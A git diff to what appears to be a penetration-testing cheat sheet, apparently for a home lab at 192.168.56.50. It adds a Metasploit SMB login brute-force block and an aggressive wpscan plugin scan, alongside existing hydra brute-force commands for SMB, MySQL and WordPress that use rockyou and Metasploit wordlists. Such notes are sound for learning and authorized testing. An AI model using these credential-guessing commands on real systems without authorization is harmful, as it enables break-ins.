@@ -35,6 +35,14 @@ $ nmap -A 192.168.56.50 -p- -T4 -v
 ```
 $ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://192.168.56.50
 ```
+or
+```
+use auxiliary/scanner/smb/smb_login
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set RHOSTS 192.168.56.50
+run
+```
 #### To Bruteforce for SMB(Port 445) with Known Usernames, e.g admin
 ```
 $ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://192.168.56.50
@@ -92,7 +100,7 @@ $ hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.56.50
 ```
 #### To connect to mysql database with credentials
 ```
-mysql -h 192.168.56.50 -u root -p
+$ mysql -h 192.168.56.50 -u root -p
 ```
 #### To dump a database after connecting to the mysql server
 ```
@@ -120,6 +128,10 @@ $ wpscan --url http://example.com --enumerate p --enumerate t --enumerate u
 #### To bruteforce password for a particular user
 ```
 $ wpscan --url http://examole.com -U blackanon -P /usr/share/wordlists/rockyou.txt
+```
+#### To enumerate plugins
+```
+$ wpscan --url http://example.com --plugins-detection aggressive -t 60
 ```
 -----------------------
 
